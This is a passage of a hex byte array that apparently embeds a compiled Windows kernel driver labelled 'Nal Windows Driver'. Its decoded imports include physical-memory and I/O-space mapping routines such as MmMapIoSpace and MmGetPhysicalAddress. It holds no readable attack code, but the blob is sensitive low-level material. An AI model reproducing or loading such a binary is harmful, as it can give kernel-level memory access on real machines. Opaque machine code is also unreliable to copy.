    0x40, 0x35, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00, 0x64, 0x66, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00,
    0xF4, 0x35, 0x00, 0x00, 0x48, 0x66, 0x00, 0x00, 0xF4, 0x35, 0x00, 0x00, 0x2F, 0x36, 0x00, 0x00,
    0x30, 0x66, 0x00, 0x00, 0x40, 0x36, 0x00, 0x00, 0x4B, 0x36, 0x00, 0x00, 0xA4, 0x66, 0x00, 0x00,
    0x4B, 0x36, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x88, 0x66, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00,
    0x3A, 0x37, 0x00, 0x00, 0x70, 0x66, 0x00, 0x00, 0x40, 0x37, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00,
    0xD4, 0x66, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00, 0xAC, 0x37, 0x00, 0x00, 0xC0, 0x66, 0x00, 0x00,
    0xAC, 0x37, 0x00, 0x00, 0xBB, 0x37, 0x00, 0x00, 0xB0, 0x66, 0x00, 0x00, 0xD0, 0x37, 0x00, 0x00,
    0xA3, 0x38, 0x00, 0x00, 0xE0, 0x66, 0x00, 0x00, 0xB0, 0x38, 0x00, 0x00, 0x6F, 0x39, 0x00, 0x00,
    0xF8, 0x66, 0x00, 0x00, 0x80, 0x39, 0x00, 0x00, 0xF1, 0x39, 0x00, 0x00, 0x14, 0x67, 0x00, 0x00,
    0x00, 0x3A, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00, 0x48, 0x67, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00,
    0x00, 0x3B, 0x00, 0x00, 0x34, 0x67, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x1A, 0x3B, 0x00, 0x00,
    0x24, 0x67, 0x00, 0x00, 0x20, 0x3B, 0x00, 0x00, 0xF8, 0x3C, 0x00, 0x00, 0x58, 0x67, 0x00, 0x00,
    0x00, 0x3D, 0x00, 0x00, 0xEA, 0x3D, 0x00, 0x00, 0x78, 0x67, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00,
    0x4F, 0x3E, 0x00, 0x00, 0x88, 0x67, 0x00, 0x00, 0x60, 0x3E, 0x00, 0x00, 0x9A, 0x3E, 0x00, 0x00,
    0x90, 0x67, 0x00, 0x00, 0xA0, 0x3E, 0x00, 0x00, 0xE6, 0x3E, 0x00, 0x00, 0x98, 0x67, 0x00, 0x00,
    0xF0, 0x3E, 0x00, 0x00, 0x8E, 0x3F, 0x00, 0x00, 0xA0, 0x67, 0x00, 0x00, 0xA0, 0x3F, 0x00, 0x00,
    0x64, 0x42, 0x00, 0x00, 0xA8, 0x67, 0x00, 0x00, 0x70, 0x42, 0x00, 0x00, 0x9A, 0x42, 0x00, 0x00,
    0xB8, 0x67, 0x00, 0x00, 0x10, 0x20, 0x5D, 0x00, 0x33, 0x20, 0x5D, 0x00, 0x34, 0x62, 0x00, 0x00,
    0x33, 0x20, 0x5D, 0x00, 0x4E, 0x21, 0x5D, 0x00, 0x20, 0x62, 0x00, 0x00, 0x4E, 0x21, 0x5D, 0x00,
    0xF9, 0x21, 0x5D, 0x00, 0x10, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x68, 0x48, 0x89, 0x58, 0x18, 0x48, 0x8B, 0xD9, 0x4C, 0x8D,
    0x05, 0xAB, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x74, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5D,
    0x02, 0x00, 0x00, 0x48, 0x89, 0x78, 0x20, 0xE8, 0xF4, 0xFE, 0xA2, 0xFF, 0x33, 0xFF, 0x48, 0x8D,
    0x05, 0x7B, 0xDE, 0xFE, 0xFF, 0x89, 0x3D, 0xD5, 0x50, 0xA3, 0xFF, 0xBA, 0x00, 0x01, 0x00, 0x00,
    0x40, 0x88, 0xB8, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89, 0x38, 0x48, 0x05, 0x10, 0x01, 0x00, 0x00,
    0x48, 0xFF, 0xCA, 0x75, 0xEB, 0x48, 0x8D, 0x05, 0x24, 0xF0, 0xA2, 0xFF, 0x48, 0x8D, 0x0D, 0xDD,
    0x59, 0xE0, 0xFF, 0xBA, 0x50, 0xC3, 0x00, 0x00, 0x48, 0x89, 0x43, 0x70, 0x48, 0x8D, 0x05, 0x6D,
    0xF0, 0xA2, 0xFF, 0x48, 0x89, 0x83, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xBF, 0xF0, 0xA2,
    0xFF, 0x48, 0x89, 0x83, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x71, 0xEF, 0xA2, 0xFF, 0x48,
    0x89, 0x43, 0x68, 0x48, 0x8D, 0x05, 0x9E, 0x50, 0xA3, 0xFF, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x89, 0x78, 0xF8, 0x48, 0x89, 0x38, 0x48, 0x89, 0x78, 0x10, 0x48, 0x89, 0x78, 0x08, 0x89, 0x78,
    0x20, 0x89, 0x78, 0x24, 0x48, 0x89, 0x78, 0x18, 0x48, 0x89, 0x78, 0x28, 0x48, 0x89, 0x78, 0x30,
    0x48, 0x89, 0x78, 0x38, 0x48, 0x89, 0x78, 0x40, 0x48, 0x89, 0x79, 0x08, 0x48, 0x89, 0x39, 0x48,
    0x89, 0x79, 0xF0, 0x48, 0x89, 0x79, 0xF8, 0x48, 0x89, 0x79, 0x10, 0x48, 0x83, 0xC0, 0x50, 0x48,
    0x83, 0xC1, 0x28, 0x48, 0xFF, 0xCA, 0x75, 0xB8, 0x48, 0x8D, 0x0D, 0xE1, 0x27, 0xA3, 0xFF, 0xE8,
    0x2C, 0xFE, 0xA2, 0xFF, 0x48, 0x8D, 0x15, 0xB5, 0x27, 0xA3, 0xFF, 0x48, 0x8D, 0x4C, 0x24, 0x40,
    0xFF, 0x15, 0x8A, 0x3F, 0xA3, 0xFF, 0x4C, 0x8D, 0x5C, 0x24, 0x70, 0x4C, 0x8D, 0x44, 0x24, 0x40,
    0x4C, 0x89, 0x5C, 0x24, 0x30, 0x41, 0xB9, 0x86, 0x80, 0x00, 0x00, 0xBA, 0x18, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0xCB, 0x40, 0x88, 0x7C, 0x24, 0x28, 0x89, 0x7C, 0x24, 0x20, 0xFF, 0x15, 0xDE, 0x3E,
    0xA3, 0xFF, 0x48, 0x8B, 0xBC, 0x24, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x79, 0x15, 0x48, 0x8D,
    0x0D, 0x2B, 0x27, 0xA3, 0xFF, 0x8B, 0xD0, 0xE8, 0xD4, 0xFD, 0xA2, 0xFF, 0xB8, 0x01, 0x00, 0x00,
    0xC0, 0xEB, 0x36, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x8D, 0x15, 0xF1, 0x26, 0xA3, 0xFF, 0x48,
    0x8D, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x43, 0x08, 0x48, 0x8B, 0x58, 0x40, 0x48, 0x89, 0x03, 0xFF,
    0x15, 0x1B, 0x3F, 0xA3, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF,
    0x15, 0x83, 0x3E, 0xA3, 0xFF, 0x85, 0xC0, 0x79, 0x1B, 0x48, 0x8D, 0x0D, 0x80, 0x26, 0xA3, 0xFF,
    0x8B, 0xD0, 0xE8, 0x89, 0xFD, 0xA2, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0xFF, 0x15, 0x86, 0x3F,
    0xA3, 0xFF, 0xEB, 0x1E, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x83, 0x48, 0x30, 0x04, 0x48, 0x8B, 0x44,
    0x24, 0x70, 0x81, 0x60, 0x30, 0x7F, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x89,
    0x43, 0x08, 0x48, 0x8D, 0x0D, 0x17, 0x26, 0xA3, 0xFF, 0xE8, 0x52, 0xFD, 0xA2, 0xFF, 0x48, 0x8D,
    0x0D, 0x7B, 0x00, 0x00, 0x00, 0xE8, 0x46, 0xFD, 0xA2, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x68, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0x05, 0x01, 0x4F, 0xA3, 0xFF, 0x49, 0xB9, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x74, 0x05, 0x49, 0x3B, 0xC1, 0x75, 0x2F, 0x4C, 0x8D, 0x05, 0xE6, 0x4E,
    0xA3, 0xFF, 0x48, 0xB8, 0x20, 0x03, 0x00, 0x00, 0x80, 0xF7, 0xFF, 0xFF, 0x48, 0x8B, 0x00, 0x49,
    0x33, 0xC0, 0x49, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x49, 0x23, 0xC0, 0x49,
    0x0F, 0x44, 0xC1, 0x48, 0x89, 0x05, 0xBE, 0x4E, 0xA3, 0xFF, 0x48, 0xF7, 0xD0, 0x48, 0x89, 0x05,
    0xAC, 0x4E, 0xA3, 0xFF, 0xE9, 0xB7, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x45, 0x6E, 0x74, 0x72, 0x79, 0x3A, 0x20,
    0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x6F, 0x76, 0x20, 0x31, 0x34, 0x20, 0x32, 0x30, 0x31, 0x33, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0A, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69,
    0x76, 0x65, 0x72, 0x20, 0x4C, 0x6F, 0x61, 0x64, 0x65, 0x64, 0x20, 0x2D, 0x2D, 0x20, 0x43, 0x6F,
    0x6D, 0x70, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x25, 0x73, 0x20, 0x25, 0x73, 0x0A, 0x00, 0xCC, 0xCC,
    0x30, 0x37, 0x3A, 0x32, 0x32, 0x3A, 0x34, 0x30, 0x00, 0xCC, 0xCC, 0xCC, 0x30, 0x23, 0x5D, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x27, 0x5D, 0x00, 0x18, 0x60, 0x00, 0x00,
    0x18, 0x23, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x27, 0x5D, 0x00,
    0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x84, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xCC, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x26, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x3C, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x54, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x90, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xB2, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xE6, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x8E, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xAC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xE2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEE, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF8, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2C, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x72, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x60, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5F, 0x01, 0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
    0x00, 0x00, 0x61, 0x01, 0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62,
    0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x00, 0x00, 0x3E, 0x04, 0x52, 0x74, 0x6C, 0x49,
    0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67,
    0x00, 0x00, 0x55, 0x01, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62,
    0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x00, 0x00, 0x4C, 0x01, 0x49, 0x6F, 0x43, 0x72,
    0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0xF6, 0x01, 0x49, 0x6F,
    0x66, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74,
    0x00, 0x00, 0x46, 0x00, 0x45, 0x78, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x50, 0x6F,
    0x6F, 0x6C, 0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0x58, 0x00, 0x45, 0x78, 0x46, 0x72,
    0x65, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0xC0, 0x02,
    0x4D, 0x6D, 0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x41, 0x64, 0x64,
    0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x31, 0x00, 0x44, 0x62, 0x67, 0x50, 0x72, 0x69, 0x6E, 0x74,
    0x00, 0x00, 0xCB, 0x05, 0x73, 0x74, 0x72, 0x6E, 0x63, 0x70, 0x79, 0x00, 0xD6, 0x05, 0x76, 0x73,
    0x70, 0x72, 0x69, 0x6E, 0x74, 0x66, 0x00, 0x00, 0x72, 0x01, 0x49, 0x6F, 0x46, 0x72, 0x65, 0x65,
    0x4D, 0x64, 0x6C, 0x00, 0xD2, 0x02, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65,
    0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x79, 0x43, 0x61, 0x63,
    0x68, 0x65, 0x00, 0x00, 0xB2, 0x02, 0x4D, 0x6D, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x4D, 0x64, 0x6C,
    0x46, 0x6F, 0x72, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x50, 0x6F, 0x6F, 0x6C, 0x00,
    0x33, 0x01, 0x49, 0x6F, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x64, 0x6C, 0x00,
    0xEE, 0x02, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65,
    0x00, 0x00, 0xEF, 0x02, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65,
    0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x00, 0xAC, 0x02, 0x4D, 0x6D, 0x41, 0x6C, 0x6C, 0x6F,
    0x63, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65,
    0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0xBB, 0x02, 0x4D, 0x6D, 0x46, 0x72, 0x65, 0x65, 0x43, 0x6F,
    0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00,
    0xD0, 0x02, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00,
    0x52, 0x03, 0x4F, 0x62, 0x66, 0x44, 0x65, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65,
    0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x00, 0x95, 0x02, 0x4B, 0x65, 0x57, 0x61, 0x69, 0x74,
    0x46, 0x6F, 0x72, 0x53, 0x69, 0x6E, 0x67, 0x6C, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00,
    0xF5, 0x01, 0x49, 0x6F, 0x66, 0x43, 0x61, 0x6C, 0x6C, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x00,
    0x3E, 0x01, 0x49, 0x6F, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x53, 0x79, 0x6E, 0x63, 0x68, 0x72, 0x6F,
    0x6E, 0x6F, 0x75, 0x73, 0x46, 0x73, 0x64, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x00,
    0x2E, 0x02, 0x4B, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x45, 0x76,
    0x65, 0x6E, 0x74, 0x00, 0x25, 0x05, 0x5A, 0x77, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x21, 0x04,
    0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x41, 0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 0x69, 0x6E,
    0x67, 0x00, 0xCE, 0x05, 0x73, 0x74, 0x72, 0x73, 0x74, 0x72, 0x00, 0x00, 0xB2, 0x04, 0x52, 0x74,
    0x6C, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x54, 0x6F,
    0x41, 0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x3C, 0x05, 0x5A, 0x77,
    0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x74, 0x65, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x4B, 0x65,
    0x79, 0x00, 0x4F, 0x05, 0x5A, 0x77, 0x4F, 0x70, 0x65, 0x6E, 0x4B, 0x65, 0x79, 0x00, 0xDF, 0x05,
    0x77, 0x63, 0x73, 0x6E, 0x63, 0x70, 0x79, 0x00, 0x7D, 0x01, 0x49, 0x6F, 0x47, 0x65, 0x74, 0x44,
    0x65, 0x76, 0x69, 0x63, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x50, 0x6F, 0x69, 0x6E, 0x74,
    0x65, 0x72, 0x00, 0x00, 0x7C, 0x01, 0x49, 0x6F, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x69, 0x63,
    0x65, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x73, 0x00, 0x4C, 0x03, 0x4F, 0x62,
    0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x42,
    0x79, 0x50, 0x6F, 0x69, 0x6E, 0x74, 0x65, 0x72, 0x00, 0x00, 0x13, 0x02, 0x4B, 0x65, 0x42, 0x75,
    0x67, 0x43, 0x68, 0x65, 0x63, 0x6B, 0x45, 0x78, 0x00, 0x00, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72,
    0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x3B, 0x00, 0x4B, 0x65, 0x53, 0x74, 0x61, 0x6C,
    0x6C, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
    0x73, 0x6F, 0x72, 0x00, 0x3A, 0x00, 0x4B, 0x65, 0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72,
    0x66, 0x6F, 0x72, 0x6D, 0x61, 0x6E, 0x63, 0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x00,
    0x48, 0x41, 0x4C, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
